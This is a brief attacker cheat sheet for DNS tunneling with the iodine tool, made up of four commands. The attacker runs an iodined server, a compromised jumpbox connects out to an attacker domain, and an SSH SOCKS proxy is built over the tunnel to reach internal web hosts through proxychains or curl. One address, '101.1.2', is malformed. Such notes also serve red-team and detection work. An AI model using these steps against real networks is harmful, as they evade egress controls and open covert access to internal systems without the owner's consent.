# DNS Tunneling (TCP over DNS)

## Tool: Iodine(d)

#### 1) Attacker: sudo iodined -f -c -P PASSWORD 10.1.1.1/24

#### 2) Jumpbox: sudo iodine -P PASSWORD att.tunnel.com

#### 3) Attacker: ssh USER@101.1.2 -4 -f -N -D 1080

#### 4) Attacker: proxychains curl http://192.168.0.100/test.php OR curl --socks5 127.0.0.1:1080 http://192.168.0.100/test.php
